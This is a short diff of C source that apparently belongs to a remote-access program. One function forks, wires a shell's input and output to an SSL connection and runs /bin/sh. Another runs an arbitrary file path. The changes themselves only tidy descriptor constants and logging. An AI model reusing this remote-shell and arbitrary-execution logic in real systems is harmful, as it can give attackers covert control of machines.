@@ -42,9 +42,9 @@ static void handle_shell(SSL *ssl) {
             LOG("fork() failed\n");
             exit(EXIT_FAILURE);
         case 0:
-            dup2(serv_shell[0], 0);
-            dup2(shell_serv[1], 1);
-            dup2(shell_serv[1], 2);
+            dup2(serv_shell[0], STDIN_FILENO);
+            dup2(shell_serv[1], STDOUT_FILENO);
+            dup2(shell_serv[1], STDERR_FILENO);
             close(serv_shell[1]);
             close(shell_serv[0]);
             execve("/bin/sh", NULL, NULL);
@@ -122,16 +122,7 @@ static int execute(char *file_path) {
             return -1;
         // child process
         case 0:
-            int fd = open("/tmp/output.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-            if(fd < 0) {
-                LOG("Failed to open output log in child process in execute\n");
-                exit(EXIT_FAILURE);
-            }
-            dup2(fd, STDOUT_FILENO);
-            dup2(fd, STDERR_FILENO);
-            close(fd);
-
-            LOG("Attempting to exec %s\n", file_path);
+            LOG("Attempting to exec \"%s\" in execute()\n", file_path);
             char *argv[] = {file_path, NULL};
             execve(file_path, argv, NULL);
             LOG("execve failed in execute(): %s\n", strerror(errno));
